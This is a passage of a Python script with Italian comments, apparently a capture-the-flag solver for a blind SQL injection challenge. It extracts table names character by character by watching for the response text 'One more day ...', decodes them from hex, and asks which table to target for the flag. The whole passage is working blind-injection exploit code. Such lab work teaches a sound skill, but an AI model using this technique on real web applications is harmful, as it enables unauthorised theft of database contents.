                response = requests.get(f'{url}{query}')  # Invia la richiesta
                
                if "One more day ..." in response.text:  # Match trovato
                    result[table] += c  # Aggiunge il carattere al nome parziale
                    char_found = True  # Imposta il flag
                    break  # Esce dal ciclo del dizionario, continua con il prossimo carattere
            
            # Se nessun carattere è stato trovato, il nome è completo
            if not char_found:
                break
                
        # Decodifica l'hex in stringa UTF-8
        try:
            name = bytes.fromhex(result[table]).decode('utf-8')  # Conversione
            result[table] = name  # Aggiorna la lista
            msg += f'\n[{table}] {name}'  # Aggiunge al messaggio
        except ValueError:  # Gestione errori di decodifica
            print(f"Error while decoding hex name for table {table}")
            
    # Fase 3: Guesso la flag
    # Input interattivo per scegliere la tabella target
    choosen = str(input(f'{msg}\nChoose the table to guess the secret: '))
    try:
